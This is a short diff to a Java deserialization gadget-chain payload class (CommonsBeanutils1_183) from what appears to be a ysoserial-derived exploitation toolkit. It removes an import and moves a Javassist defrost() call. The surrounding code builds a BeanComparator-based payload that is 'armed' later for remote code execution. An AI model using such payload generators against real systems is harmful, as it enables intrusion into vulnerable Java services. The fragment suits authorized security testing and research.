@@ -10,7 +10,6 @@ import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
 import me.gv7.woodpecker.yso.payloads.util.Gadgets;
 import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
 import me.gv7.woodpecker.yso.payloads.util.Reflections;
-import org.apache.commons.beanutils.BeanComparator;
 
 import java.math.BigInteger;
 import java.util.Comparator;
@@ -28,7 +27,7 @@ public class CommonsBeanutils1_183 implements ObjectPayload<Object> {
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
         final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
-        ctBeanComparator.defrost();
+
         try {
             CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
             ctBeanComparator.removeField(ctSUID);
@@ -37,6 +36,7 @@ public class CommonsBeanutils1_183 implements ObjectPayload<Object> {
 
         // mock method name until armed
         final Comparator comparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
+        ctBeanComparator.defrost();
         Reflections.setFieldValue(comparator, "property", "lowestSetBit");
 
 		// create queue with numbers and basic comparator
